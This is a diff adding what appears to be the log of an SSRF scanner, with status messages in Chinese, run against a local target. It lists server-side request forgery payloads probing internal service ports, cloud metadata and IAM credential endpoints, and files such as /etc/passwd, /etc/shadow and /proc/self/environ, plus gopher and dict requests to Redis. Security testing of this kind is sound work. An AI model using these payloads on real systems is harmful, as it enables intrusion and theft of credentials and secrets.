@@ -1,0 +1,143 @@
+
+[GET] 正在测试 http://127.0.0.1:9200
+[GET] 正在测试 http://127.0.0.1:5984
+[GET] 正在测试 http://127.0.0.1:9000
+[GET] 正在测试 http://127.0.0.1:2375
+[GET] 正在测试 http://127.0.0.1:8086
+[GET] 正在测试 http://127.0.0.1:3306
+[GET] 正在测试 http://127.0.0.1:6379
+[GET] 正在测试 http://127.0.0.1:5432
+[GET] 正在测试 http://127.0.0.1:27017
+[GET] 正在测试 http://127.0.0.1:11211
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A3306 payload: url=http://127.0.0.1:3306
+[GET] 正在测试 http://127.0.0.1:5000
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A27017 payload: url=http://127.0.0.1:27017
+[GET] 正在测试 http://127.0.0.1:8080
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A9000 payload: url=http://127.0.0.1:9000
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A11211 payload: url=http://127.0.0.1:11211
+[GET] 正在测试 http://127.0.0.1:8888
+[GET] 正在测试 http://127.0.0.1:80
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A5984 payload: url=http://127.0.0.1:5984
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A2375 payload: url=http://127.0.0.1:2375
+[GET] 正在测试 http://127.0.0.1:443
+[GET] 正在测试 http://127.0.0.1:22
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A5432 payload: url=http://127.0.0.1:5432
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A6379 payload: url=http://127.0.0.1:6379
+[GET] 正在测试 http://127.0.0.1:3389
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A80 payload: url=http://127.0.0.1:80
+[GET] 正在测试 http://127.0.0.1:21
+[GET] 正在测试 http://127.0.0.1:445
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A445 payload: url=http://127.0.0.1:445
+[GET] 正在测试 http://localhost:6379
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A8086 payload: url=http://127.0.0.1:8086
+[GET] 正在测试 http://localhost:3306
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A9200 payload: url=http://127.0.0.1:9200
+[GET] 正在测试 http://localhost:5432
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A3306 payload: url=http://localhost:3306
+[GET] 正在测试 http://localhost:27017
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A5000 payload: url=http://127.0.0.1:5000
+[GET] 正在测试 http://localhost:9200
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A8080 payload: url=http://127.0.0.1:8080
+[GET] 正在测试 http://localhost:11211
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A8888 payload: url=http://127.0.0.1:8888
+[GET] 正在测试 http://localhost:5984
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A443 payload: url=http://127.0.0.1:443
+[GET] 正在测试 http://localhost:2375
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A21 payload: url=http://127.0.0.1:21
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A3389 payload: url=http://127.0.0.1:3389
+[GET] 正在测试 http://localhost:8086
+[GET] 正在测试 http://localhost:9000
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A6379 payload: url=http://localhost:6379
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A5432 payload: url=http://localhost:5432
+[GET] 正在测试 http://localhost:8080
+[GET] 正在测试 http://localhost:5000
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A27017 payload: url=http://localhost:27017
+[GET] 正在测试 http://localhost:8888
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A9200 payload: url=http://localhost:9200
+[GET] 正在测试 http://localhost:80
+[GET] http://127.0.0.1/?url=http%3A%2F%2F127.0.0.1%3A22 payload: url=http://127.0.0.1:22
+[GET] 正在测试 http://localhost:443
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A80 payload: url=http://localhost:80
+[GET] 正在测试 http://localhost:22
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A11211 payload: url=http://localhost:11211
+[GET] 正在测试 http://localhost:21
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A5984 payload: url=http://localhost:5984
+[GET] 正在测试 http://localhost:3389
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A2375 payload: url=http://localhost:2375
+[GET] 正在测试 http://localhost:445
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A8086 payload: url=http://localhost:8086
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A9000 payload: url=http://localhost:9000
+[GET] 正在测试 http://0.0.0.0:6379
+[GET] 正在测试 http://0.0.0.0:3306
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A3306 payload: url=http://0.0.0.0:3306
+[GET] 正在测试 http://0.0.0.0:5432
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A445 payload: url=http://localhost:445
+[GET] 正在测试 http://0.0.0.0:27017
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A27017 payload: url=http://0.0.0.0:27017
+[GET] 正在测试 http://0.0.0.0:9200
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A9200 payload: url=http://0.0.0.0:9200
+[GET] 正在测试 http://0.0.0.0:11211
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A11211 payload: url=http://0.0.0.0:11211
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A6379 payload: url=http://0.0.0.0:6379
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A5432 payload: url=http://0.0.0.0:5432
+[GET] 正在测试 http://0.0.0.0:5984
+[GET] 正在测试 http://0.0.0.0:2375
+[GET] 正在测试 http://0.0.0.0:8086
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A5984 payload: url=http://0.0.0.0:5984
+[GET] 正在测试 http://0.0.0.0:9000
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A2375 payload: url=http://0.0.0.0:2375
+[GET] 正在测试 http://0.0.0.0:5000
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A8086 payload: url=http://0.0.0.0:8086
+[GET] 正在测试 http://0.0.0.0:8080
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A9000 payload: url=http://0.0.0.0:9000
+[GET] 正在测试 http://0.0.0.0:8888
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A5000 payload: url=http://localhost:5000
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A8080 payload: url=http://localhost:8080
+[GET] 正在测试 http://0.0.0.0:443
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A5000 payload: url=http://0.0.0.0:5000
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A8080 payload: url=http://0.0.0.0:8080
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A8888 payload: url=http://0.0.0.0:8888
+[GET] 正在测试 http://0.0.0.0:80
+[GET] 正在测试 http://0.0.0.0:22
+[GET] 正在测试 http://0.0.0.0:21
+[GET] 正在测试 http://0.0.0.0:3389
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A443 payload: url=http://0.0.0.0:443
+[GET] 正在测试 http://0.0.0.0:445
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A80 payload: url=http://0.0.0.0:80
+[GET] 正在测试 http://169.254.169.254/latest/meta-data/
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A22 payload: url=http://0.0.0.0:22
+[GET] 正在测试 http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A3389 payload: url=http://0.0.0.0:3389
+[GET] 正在测试 http://metadata.google.internal/computeMetadata/v1/
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A445 payload: url=http://0.0.0.0:445
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A8888 payload: url=http://localhost:8888
+[GET] 正在测试 http://100.100.100.200/latest/meta-data/
+[GET] http://127.0.0.1/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F payload: url=http://169.254.169.254/latest/meta-data/
+[GET] http://127.0.0.1/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F payload: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[GET] http://127.0.0.1/?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F payload: url=http://metadata.google.internal/computeMetadata/v1/
+[GET] http://127.0.0.1/?url=http%3A%2F%2F0.0.0.0%3A21 payload: url=http://0.0.0.0:21
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A443 payload: url=http://localhost:443
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A22 payload: url=http://localhost:22
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A21 payload: url=http://localhost:21
+[GET] http://127.0.0.1/?url=http%3A%2F%2Flocalhost%3A3389 payload: url=http://localhost:3389
+[GET] http://127.0.0.1/?url=http%3A%2F%2F100.100.100.200%2Flatest%2Fmeta-data%2F Error: 请求失败: Get "http://127.0.0.1/?url=http%3A%2F%2F100.100.100.200%2Flatest%2Fmeta-data%2F": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[GET] 正在测试 file:///etc/hosts
+[GET] 正在测试 gopher://127.0.0.1:6379/_INFO
+[GET] 正在测试 file:///proc/self/environ
+[GET] 正在测试 file:///proc/self/cmdline
+[GET] 正在测试 file:///etc/passwd
+[GET] 正在测试 file:///c:/windows/win.ini
+[GET] 正在测试 file:///etc/shadow
+[GET] 正在测试 dict://127.0.0.1:6379/info
+[GET] 正在测试 file:///c:/windows/system32/drivers/etc/hosts
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fproc%2Fself%2Fcmdline payload: url=file:///proc/self/cmdline
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fproc%2Fself%2Fenviron payload: url=file:///proc/self/environ
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fetc%2Fhosts payload: url=file:///etc/hosts
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fetc%2Fpasswd payload: url=file:///etc/passwd
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fetc%2Fshadow payload: url=file:///etc/shadow
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini payload: url=file:///c:/windows/win.ini
+[GET] http://127.0.0.1/?url=file%3A%2F%2F%2Fc%3A%2Fwindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts payload: url=file:///c:/windows/system32/drivers/etc/hosts
+[GET] http://127.0.0.1/?url=dict%3A%2F%2F127.0.0.1%3A6379%2Finfo payload: url=dict://127.0.0.1:6379/info
+[GET] http://127.0.0.1/?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO payload: url=gopher://127.0.0.1:6379/_INFO
+
+扫描完成，发现 69 个漏洞
